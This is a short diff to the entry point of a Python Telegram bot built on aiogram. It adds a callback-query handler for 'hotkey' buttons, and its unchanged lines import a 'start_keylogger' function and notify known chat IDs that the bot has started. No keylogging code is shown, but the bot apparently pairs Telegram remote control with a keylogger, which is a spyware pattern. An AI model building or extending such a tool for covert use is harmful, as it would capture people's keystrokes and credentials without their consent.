@@ -6,9 +6,9 @@ import asyncio
 
 from aiogram import Bot, Dispatcher, types
 from aiogram.filters import Command
-from aiogram.types import Message
+from aiogram.types import Message, CallbackQuery
 from config import TOKEN, KNOWN_IDS
-from handlers import handle_message, send_safe_message
+from handlers import handle_message, send_safe_message, handle_hotkey_callback
 from loggers import setup_logging, start_keylogger
 
 
@@ -51,6 +51,10 @@ async def main():
     async def handle_all_messages(message: Message):
         await handle_message(message, bot)
 
+    @dp.callback_query()
+    async def handle_all_callbacks(callback: CallbackQuery):
+        await handle_hotkey_callback(callback, bot)
+
     for chat_id in KNOWN_IDS:
         await send_safe_message(bot, chat_id, "Бот запущен")
 
@@ -59,3 +63,5 @@ async def main():
 
 if __name__ == '__main__':
     asyncio.run(main())
+
+
